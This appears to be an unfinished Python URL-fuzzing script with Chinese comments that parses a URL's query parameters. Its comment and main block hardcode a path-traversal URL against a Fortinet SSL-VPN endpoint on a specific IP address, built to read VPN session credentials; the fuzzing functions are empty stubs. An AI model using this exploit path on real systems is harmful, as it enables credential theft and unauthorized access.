import requests
from urllib.parse import urlparse
import re

# ParseResult(
#       scheme='https',
#       netloc='216.118.152.17:444', 
#       path='/remote/fgt_lang',
#       params='', 
#       query='lang=/../../../..//////////dev/cmdb/sslvpn_websession&pwd=222', 
#       fragment='')

class getPathFuzz():
    def __init__(self,inputUrl:str):
        self.inputUrl = inputUrl
    # 解析url
    def inputUrlParse(self,inputUrlParse:str):
        print(urlparse(inputUrlParse))
        return urlparse(inputUrlParse)

    # 先对query进行测试
    def inputUrlQueryCheck(self,inputUrlQuery):
        # 参数初始化解析
        def inputQueryCheck(inputUrlQuery : str):
            querySplitDict = {}
            # 先判断是否有参数
            if len(inputUrlQuery) == 0:
                return querySplitDict    
            querySplitList = inputUrlQuery.split("&")
            # query 参数解析
            for num in range(len(querySplitList)):
                querySplitDict[querySplitList[num].split("=")[0]] = querySplitList[num].split("=")[1]
            return querySplitDict
            
        # 参数Fuzz
        def inputQueryFuzz(querySplitDict:dict):
            print(querySplitDict)
            if len(querySplitDict) == 0:
                return {"code":False,"message":"未获取到解析参数"}
            # 先改变参数值
            for i in querySplitDict.keys():
                print(querySplitDict[i])
            # 先测目录穿越漏洞
            
            return {"code":True,"message":"获取到解析参数"}
        querySplitDict = inputQueryCheck(inputUrlQuery)
        a = inputQueryFuzz(querySplitDict)
        print(a)

    # scheme 测试
    def inputSchemeCheck(self):
        pass
    # path 测试
    def inputPathCheck(self):
        pass
    # params 测试 
    def inputParamsCheck(self):
        pass
    # fragment 测试
    def inputFragmentCheck(self):
        pass
    # 输出拼接好的Url
    def outPutUrl(self):
        pass

    def main(self):
        inputUrlParse =  self.inputUrlParse(self.inputUrl)
        self.inputUrlQueryCheck(inputUrlParse.query)

if "__main__" == __name__:
    urlPath = "https://216.118.152.17:444/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession&pwd=222"
    start = getPathFuzz(inputUrl=urlPath)
    start.main()